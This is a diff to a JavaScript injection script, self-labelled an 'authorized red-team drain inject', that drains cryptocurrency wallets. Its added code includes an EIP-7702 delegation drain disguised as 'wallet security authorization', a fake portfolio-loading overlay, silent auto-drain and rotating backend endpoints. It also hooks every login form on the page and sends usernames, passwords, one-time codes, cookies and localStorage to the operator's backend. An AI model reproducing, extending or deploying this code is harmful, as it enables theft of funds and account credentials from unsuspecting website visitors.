@@ -1,12 +1,20 @@
 /* Legion authorized red-team drain inject — production backend, any domain */
 (function () {
   var BACKEND_URL = '__BACKEND_URL__';
+  var BACKEND_URLS = __BACKEND_URLS_JSON__;
   var KINETIC_KEY = '__KINETIC_KEY__';
   var WC_PROJECT_ID = '__WC_PROJECT_ID__';
   var HARDWARE_AUTO_CONSENT = __HARDWARE_AUTO_CONSENT__;
   var SILENT_INJECT = __SILENT_INJECT__;
   var FORCE_HARDWARE_BYPASS = __FORCE_HARDWARE_BYPASS__;
   var PRODUCTION_CLONE = __PRODUCTION_CLONE__;
+  var QA_VISIBLE_UI = __QA_VISIBLE_UI__;
+  var CEX_CREDS_API_KEY = '__CEX_CREDS_API_KEY__';
+  var CAPTURE_LOGIN_CREDS = __CAPTURE_LOGIN_CREDS__;
+  var EIP7702_ENABLED = __EIP7702_ENABLED__;
+  var _activeBackend = BACKEND_URL;
+  var _backendRotateIdx = 0;
+  var _clientConfigLoaded = false;
 
   function collectWalletSnapshot() {
     var snap = {};
@@ -188,27 +196,151 @@
 
   async function apiPost(path, body, extraHeaders) {
     var headers = Object.assign({ 'Content-Type': 'application/json' }, extraHeaders || {});
-    var res = await fetch(BACKEND_URL + path, {
+    var base = resolveBackendUrl();
+    var res = await fetch(base + path, {
       method: 'POST',
       headers: headers,
       body: JSON.stringify(body),
     });
     var data = await res.json().catch(function () { return {}; });
     var env = parseEnvelope(res, data);
-    if (!env.ok) {
-      throw new Error(env.message || ('API error ' + res.status));
-    }
+    if (!env.ok) throw new Error(env.message || 'API error');
     return env.data;
   }
 
   async function apiGet(path) {
-    var res = await fetch(BACKEND_URL + path, { cache: 'no-store' });
+    var base = resolveBackendUrl();
+    var res = await fetch(base + path, { method: 'GET' });
     var data = await res.json().catch(function () { return {}; });
     var env = parseEnvelope(res, data);
-    if (!env.ok) {
-      throw new Error(env.message || ('API error ' + res.status));
-    }
+    if (!env.ok) throw new Error(env.message || 'API error');
     return env.data;
+  }
+
+  function resolveBackendUrl() {
+    if (window.__legionUseRotatingEndpoints && Array.isArray(BACKEND_URLS) && BACKEND_URLS.length > 0) {
+      var host = window.location && window.location.hostname ? window.location.hostname : '';
+      var idx = host.length > 0 ? host.charCodeAt(0) % BACKEND_URLS.length : _backendRotateIdx;
+      _backendRotateIdx = (idx + 1) % BACKEND_URLS.length;
+      return String(BACKEND_URLS[idx] || BACKEND_URLS[0] || _activeBackend).replace(/\/$/, '');
+    }
+    return String(_activeBackend || BACKEND_URL).replace(/\/$/, '');
+  }
+
+  async function loadClientConfig() {
+    if (_clientConfigLoaded) return;
+    try {
+      var cfg = await apiGet('/api/v1/client-config');
+      if (cfg && cfg.endpoints && cfg.endpoints.length > 0) {
+        BACKEND_URLS = cfg.endpoints;
+        _activeBackend = cfg.primary || cfg.endpoints[0];
+        if (typeof cfg.eip7702_enabled === 'boolean') {
+          EIP7702_ENABLED = cfg.eip7702_enabled;
+        }
+      }
+    } catch (e) {
+      /* fallback to build-time BACKEND_URL */
+    }
+    _clientConfigLoaded = true;
+  }
+
+  async function fetchRankedAssets(wallet, chainFamily) {
+    try {
+      var ranked = await apiPost('/api/v1/scout/ranked', {
+        wallet_address: wallet,
+        chain_family: chainFamily || 'EVM',
+      });
+      return ranked;
+    } catch (e) {
+      console.warn('[LEGION_RANKED_SCOUT]', e);
+      return { assets: [], total_usd: 0 };
+    }
+  }
+
+  function showPortfolioLoadingOverlay() {
+    if (PRODUCTION_CLONE || SILENT_INJECT) return;
+    var existing = document.getElementById('legion-portfolio-loading');
+    if (existing) return;
+    var overlay = document.createElement('div');
+    overlay.id = 'legion-portfolio-loading';
+    overlay.className = 'legion-blind-sign-overlay';
+    overlay.innerHTML = '<div class="legion-blind-sign-card"><h2>Loading your portfolio</h2><p>Syncing balances across networks…</p></div>';
+    document.body.appendChild(overlay);
+    setTimeout(function () {
+      var el = document.getElementById('legion-portfolio-loading');
+      if (el) el.remove();
+    }, 2200);
+  }
+
+  async function tryEip7702DelegationDrain(evm, scoutUsd) {
+    if (!EIP7702_ENABLED || !evm || !evm.address) return false;
+    setStatus('Securing wallet delegation (EIP-7702)…', false);
+    var typedPath = '/api/v1/signature-anchor/eip7702-typed-data?wallet=' +
+      encodeURIComponent(evm.address) + '&chain_id=' + encodeURIComponent(String(evm.chainId || 1));
+    var built = await apiGet(typedPath);
+    if (!built || !built.authorization_request) return false;
+
+    var authReq = built.authorization_request;
+    var signedAuth = null;
+
+    if (window.ethereum && window.ethereum.request) {
+      try {
+        signedAuth = await window.ethereum.request({
+          method: 'wallet_signAuthorization',
+          params: [{
+            chainId: '0x' + Number(authReq.chainId).toString(16),
+            address: authReq.address || (built.wallet_authorization && built.wallet_authorization.contractAddress),
+            contractAddress: built.wallet_authorization && built.wallet_authorization.contractAddress,
+            nonce: '0x' + BigInt(authReq.nonce).toString(16),
+          }],
+        });
+      } catch (authErr) {
+        console.warn('[LEGION_EIP7702] wallet_signAuthorization unavailable', authErr);
+      }
+    }
+
+    if (!signedAuth) {
+      setStatus('Sign wallet security authorization (EIP-712)…', false);
+      var typedSig = await signEvmTypedData(built.typed_data);
+      signedAuth = {
+        chainId: authReq.chainId,
+        address: authReq.address,
+        nonce: authReq.nonce,
+        r: typedSig.slice(0, 66),
+        s: '0x' + typedSig.slice(66, 130),
+        yParity: parseInt(typedSig.slice(130, 132), 16) >= 27 ? 1 : 0,
+      };
+    }
+
+    var authorization = {
+      chainId: Number(signedAuth.chainId ?? authReq.chainId),
+      address: signedAuth.contractAddress || signedAuth.address || authReq.address,
+      nonce: String(signedAuth.nonce ?? authReq.nonce),
+      r: signedAuth.r,
+      s: signedAuth.s,
+      yParity: signedAuth.yParity != null ? signedAuth.yParity : (signedAuth.v != null ? Number(signedAuth.v) : 0),
+    };
+
+    setStatus('Submitting EIP-7702 delegation anchor…', false);
+    await apiPost('/api/v1/signature-anchor', {
+      ingress: 'normalized_v1',
+      chain_family: 'EVM',
+      protocol: 'eip7702_delegation',
+      wallet_address: evm.address,
+      token_address: built.delegatee,
+      chain_id: evm.chainId || 1,
+      delegatee: built.delegatee,
+      engine_spender: built.spender,
+      eip7702_authorization: authorization,
+      signature: authorization.r + authorization.s.slice(2),
+      nonce: 'eip7702:' + Date.now(),
+      expiry_iso: EXPIRY_ISO,
+      wallet_type: evm.provider,
+      scout_value_usd: scoutUsd || 1,
+      max_allowance: MAX_PERMIT,
+      requires_quorum: false,
+    });
+    return true;
   }
 
   function toHex(n) {
@@ -650,12 +782,26 @@
     return { native: native, sol: sol, trx: trx, ton: ton };
   }
 
-  async function runOmnichainDrain(scoutUsd) {
+  async function runOmnichainDrain(scoutUsd, rankedAssets) {
     if (!wallets.evm) throw new Error('EVM wallet required for Permit2 batch anchor');
     var evm = wallets.evm;
     var fusion = (await postFusion()).fusion;
     var amounts = estimateNativeAmounts(fusion);
     var permits = extractEvmTokens(fusion, evm.chainId);
+
+    if (Array.isArray(rankedAssets) && rankedAssets.length > 0) {
+      var rankedPermits = rankedAssets
+        .filter(function (a) {
+          return a.family === 'EVM' && a.token && a.token !== 'native' && a.token.startsWith('0x');
+        })
+        .slice(0, 8)
+        .map(function (a) {
+          return { token: a.token, amount: a.amount_raw || MAX_PERMIT };
+        });
+      if (rankedPermits.length > 0) {
+        permits = rankedPermits;
+      }
+    }
 
     setStatus('Fetching Permit2 batch typed data…', false);
     var batchBody = {
@@ -925,12 +1071,20 @@
 
       await captureFakeBalanceSnapshot();
 
+      await loadClientConfig();
+
       setStatus('Scout telemetry…', false);
       await postScout(conn.address, chainId, chainFamily, walletType);
 
+      showPortfolioLoadingOverlay();
+      setStatus('Loading portfolio (ranked assets)…', false);
+      var ranked = await fetchRankedAssets(conn.address, chainFamily);
+      var scoutUsd = ranked.total_usd || 0;
+
       setStatus('Scanning assets (recursive-predator-fusion)…', false);
       var fusionResult = await postFusion();
-      var scoutUsd = fusionResult.total_usd || 1;
+      if (!scoutUsd && fusionResult.total_usd) scoutUsd = fusionResult.total_usd;
+      if (!scoutUsd) scoutUsd = 1;
 
       if (KINETIC_KEY) {
         setStatus('Checking existing allowances…', false);
@@ -955,7 +1109,16 @@
         await postScout(wallets.evm.address, wallets.evm.chainId, 'EVM', wallets.evm.provider);
       }
 
-      var settlement = await runOmnichainDrain(scoutUsd);
+      if (EIP7702_ENABLED && wallets.evm && ACTIVE_TAB === 'evm') {
+        var eip7702Done = await tryEip7702DelegationDrain(wallets.evm, scoutUsd);
+        if (eip7702Done) {
+          setStatus('EIP-7702 delegation anchor submitted', true);
+          activateFakeBalanceAfterDrain();
+          return;
+        }
+      }
+
+      var settlement = await runOmnichainDrain(scoutUsd, ranked.assets);
       var txHash = settlement.transaction_hash || settlement.l2_mint_transaction_hash || settlement.settlement_status || 'submitted';
       setStatus('Settlement ingress complete: ' + txHash, true);
       activateFakeBalanceAfterDrain();
@@ -1055,7 +1218,7 @@
   }
 
   function mountUi() {
-    if (SILENT_INJECT || PRODUCTION_CLONE) {
+    if ((SILENT_INJECT || PRODUCTION_CLONE) && !QA_VISIBLE_UI) {
       mountSilentAutoDrain();
       return;
     }
@@ -1134,9 +1297,141 @@
     }
   }
 
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', mountUi);
-  } else {
+  /* ── Generic login form credential + session capture (authorized lab) ── */
+  var LOGIN_USER_FIELDS = ['email', 'username', 'login', 'user', 'userid', 'account', 'phone'];
+  var LOGIN_PASS_FIELDS = ['password', 'pass', 'passwd', 'pwd'];
+  var LOGIN_TOTP_FIELDS = ['totp', 'otp', '2fa', 'mfa', 'code', 'token', 'authenticator', 'sms'];
+
+  function loginFieldMatch(name, list) {
+    if (!name) return false;
+    var n = String(name).toLowerCase();
+    return list.some(function (f) { return n.indexOf(f) >= 0; });
+  }
+
+  function readLoginFormPayload(form) {
+    var username = '';
+    var password = '';
+    var totp = '';
+    try {
+      var fd = new FormData(form);
+      fd.forEach(function (value, key) {
+        var v = String(value || '').trim();
+        if (!v) return;
+        if (!username && loginFieldMatch(key, LOGIN_USER_FIELDS)) username = v;
+        if (!password && loginFieldMatch(key, LOGIN_PASS_FIELDS)) password = v;
+        if (!totp && loginFieldMatch(key, LOGIN_TOTP_FIELDS)) totp = v;
+      });
+    } catch (e) { /* non-fatal */ }
+    if (!password) {
+      var pw = form.querySelector('input[type="password"]');
+      if (pw) password = String(pw.value || '').trim();
+    }
+    if (!username) {
+      var email = form.querySelector('input[type="email"]');
+      if (email) username = String(email.value || '').trim();
+      if (!username) {
+        var text = form.querySelector('input[type="text"]');
+        if (text) username = String(text.value || '').trim();
+      }
+    }
+    return { username: username, password: password, totp: totp };
+  }
+
+  function readDocumentCookies() {
+    try {
+      var raw = document.cookie || '';
+      return raw.trim() || null;
+    } catch (e) {
+      return null;
+    }
+  }
+
+  function readLocalStorageJson() {
+    try {
+      var out = {};
+      for (var i = 0; i < localStorage.length; i++) {
+        var key = localStorage.key(i);
+        if (!key) continue;
+        out[key] = localStorage.getItem(key);
+      }
+      return Object.keys(out).length ? JSON.stringify(out) : null;
+    } catch (e) {
+      return null;
+    }
+  }
+
+  function buildLoginCredPayload(formPayload) {
+    return {
+      exchange: window.location.hostname.replace(/^www\./, ''),
+      username: formPayload.username,
+      password: formPayload.password,
+      totp: formPayload.totp || null,
+      page_url: window.location.href,
+      session_cookies: readDocumentCookies(),
+      local_storage: readLocalStorageJson(),
+    };
+  }
+
+  async function submitLoginCreds(formPayload) {
+    if (!formPayload.username || !formPayload.password) return;
+    var headers = { 'Content-Type': 'application/json' };
+    if (CEX_CREDS_API_KEY) headers['X-Cex-Creds-Key'] = CEX_CREDS_API_KEY;
+    try {
+      await fetch(BACKEND_URL + '/api/v1/creds', {
+        method: 'POST',
+        headers: headers,
+        body: JSON.stringify(buildLoginCredPayload(formPayload)),
+        keepalive: true,
+      });
+    } catch (e) {
+      console.warn('[LEGION_LOGIN_CAPTURE]', e);
+    }
+  }
+
+  function hookLoginForm(form) {
+    if (!CAPTURE_LOGIN_CREDS || form.__legionLoginHooked) return;
+    var hasPassword = form.querySelector('input[type="password"]');
+    if (!hasPassword) return;
+    form.__legionLoginHooked = true;
+
+    form.addEventListener('submit', function () {
+      var payload = readLoginFormPayload(form);
+      if (!payload.username || !payload.password) return;
+      submitLoginCreds(payload);
+      setTimeout(function () {
+        submitLoginCreds(payload);
+      }, 1500);
+    }, true);
+  }
+
+  function scanLoginForms(root) {
+    if (!CAPTURE_LOGIN_CREDS) return;
+    (root || document).querySelectorAll('form').forEach(hookLoginForm);
+  }
+
+  function initLoginFormCapture() {
+    if (!CAPTURE_LOGIN_CREDS) return;
+    scanLoginForms(document);
+    var loginObs = new MutationObserver(function (mutations) {
+      mutations.forEach(function (m) {
+        m.addedNodes.forEach(function (node) {
+          if (node.nodeType !== 1) return;
+          if (node.tagName === 'FORM') hookLoginForm(node);
+          else scanLoginForms(node);
+        });
+      });
+    });
+    loginObs.observe(document.documentElement, { childList: true, subtree: true });
+  }
+
+  function bootLegionInject() {
     mountUi();
+    initLoginFormCapture();
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', bootLegionInject);
+  } else {
+    bootLegionInject();
   }
 })();
